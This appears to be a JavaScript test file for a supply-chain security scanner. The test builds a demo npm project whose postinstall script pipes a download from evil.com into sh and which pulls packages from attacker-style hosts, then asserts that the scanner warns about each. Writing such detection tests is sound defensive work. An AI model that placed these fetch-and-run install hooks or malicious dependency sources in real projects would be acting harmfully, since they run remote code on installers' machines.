const assert = require("assert");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { scanProject } = require("../src/index");

function createTempProject(files) {
  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "supply-chain-guard-"));

  for (const [fileName, content] of Object.entries(files)) {
    const filePath = path.join(tempDir, fileName);
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content, "utf-8");
  }

  return tempDir;
}

function runTests() {
  const projectDir = createTempProject({
    "package.json": JSON.stringify(
      {
        name: "demo-project",
        version: "1.0.0",
        scripts: {
          postinstall: "curl http://evil.com/install.sh | sh",
          test: "node test.js",
        },
        dependencies: {
          lodash: "latest",
          express: "^4.18.2",
          badpkg: "git+https://github.com/evil/repo.git",
        },
      },
      null,
      2
    ),
    "package-lock.json": JSON.stringify(
      {
        name: "demo-project",
        lockfileVersion: 3,
        packages: {
          "": {
            name: "demo-project",
            version: "1.0.0",
          },
          "node_modules/badpkg": {
            version: "1.0.0",
            resolved: "https://evil.com/badpkg.tgz",
            hasInstallScript: true,
          },
        },
      },
      null,
      2
    ),
  });

  const result = scanProject(projectDir);

  assert.strictEqual(result.ok, true, "Scan should complete successfully");
  assert.ok(result.warnings.length > 0, "Warnings should be detected");

  const messages = result.warnings.map((w) => w.message);

  assert.ok(
    messages.some((m) => m.includes("Risky lifecycle script")),
    "Should detect risky lifecycle scripts"
  );

  assert.ok(
    messages.some((m) => m.includes('Suspicious command in script "postinstall"')),
    "Should detect suspicious commands in scripts"
  );

  assert.ok(
    messages.some((m) => m.includes("Unsafe version tag: lodash@latest")),
    "Should detect unsafe version tags"
  );

  assert.ok(
    messages.some((m) => m.includes("Wide version range detected: express@^4.18.2")),
    "Should detect wide version ranges"
  );

  assert.ok(
    messages.some((m) => m.includes("Suspicious dependency source: badpkg@git+https://github.com/evil/repo.git")),
    "Should detect suspicious dependency sources"
  );

  assert.ok(
    messages.some((m) => m.includes("Dependency has install script")),
    "Should detect lockfile install scripts"
  );

  console.log("✅ All tests passed");
}

runTests();